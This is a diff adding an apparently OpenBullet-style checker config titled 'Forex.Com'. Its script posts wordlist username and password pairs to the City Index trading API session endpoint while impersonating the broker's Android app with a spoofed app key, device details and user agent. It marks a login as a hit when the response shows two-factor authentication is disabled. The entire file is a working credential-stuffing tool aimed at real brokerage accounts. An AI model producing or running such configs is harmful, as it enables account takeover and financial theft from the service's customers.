@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "Forex.Com ",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T02:39:26.7793766-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://ciapi.cityindex.com/TradingApi/session" 
+  CONTENT "{\"UserName\":\"<USER>\",\"Password\":\"<PASS>\",\"AppKey\":\"AND-FRX\",\"AppComments\":\"Device Model: SM-N9005, Operating System: LOLLIPOP_MR1, Operating System Version: 5.1.1, API Version: 22\",\"AppVersion\":\"3.12.0.21606\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY " login has failed" 
+  KEYCHAIN Success OR 
+    KEY "Is2FAEnabled\":false" 
+
